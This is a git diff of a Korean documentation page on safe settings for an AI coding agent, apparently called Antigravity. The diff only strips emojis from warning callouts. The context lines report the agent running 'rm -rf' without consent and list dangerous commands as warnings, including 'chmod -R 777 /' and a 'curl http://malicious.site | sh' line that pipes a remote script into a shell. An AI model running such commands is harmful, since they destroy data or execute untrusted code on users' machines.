@@ -7,7 +7,7 @@ order: 6
 
 안티그래비티 사용 시 **파일 손실을 방지**하기 위해 반드시 확인해야 할 설정입니다.
 
-<Callout type="danger" title="🚨 실제 사고 사례 - 반드시 읽으세요">
+<Callout type="danger" title="실제 사고 사례 - 반드시 읽으세요">
 "Turbo" 또는 "Auto" 설정 시, AI가 사용자 동의 없이 파일 삭제 명령(`rm -rf`)을 실행하여 **드라이브 전체가 삭제**된 사고가 다수 보고되었습니다.
 </Callout>
 
@@ -79,7 +79,7 @@ chmod -R 777 /              # 모든 파일 권한 변경 ⚠️
 curl http://malicious.site | sh   # 악성 스크립트 실행 🚨
 ```
 
-<Callout type="danger" title="🚨 절대 규칙">
+<Callout type="danger" title="절대 규칙">
 **Turbo나 Auto 모드를 절대 사용하지 마세요!**
 
 AI가 아무리 똑똑해도 실수할 수 있습니다. 모든 터미널 명령은 **사용자가 눈으로 확인하고 Approve 버튼**을 누르는 방식으로만 진행해야 합니다.
@@ -328,7 +328,7 @@ icacls "C:\Users\사용자명\Documents\MyProjects" /grant 사용자명:F /T
 - [ ] Git 저장소 초기화 완료
 - [ ] 백업 계획 수립 완료
 
-<Callout type="success" title="✅ 안전 제일!">
+<Callout type="success" title="안전 제일!">
 이 모든 설정은 귀찮아 보이지만, **한 번의 실수가 몇 주간의 작업을 날릴 수 있습니다**. 반드시 체크리스트를 확인하고 시작하세요!
 </Callout>
 
@@ -342,7 +342,7 @@ icacls "C:\Users\사용자명\Documents\MyProjects" /grant 사용자명:F /T
 2. **커뮤니티:** https://reddit.com/r/antigravity
 3. **버그 리포트:** https://github.com/google/antigravity/issues
 
-<Callout type="warning" title="⚠️ 최종 경고">
+<Callout type="warning" title="최종 경고">
 **Turbo 모드는 절대 사용하지 마세요!**
 
 AI가 아무리 발전해도 100% 완벽하지 않습니다. 터미널 명령어는 반드시 사용자가 직접 확인하고 승인하는 방식으로만 사용하세요.
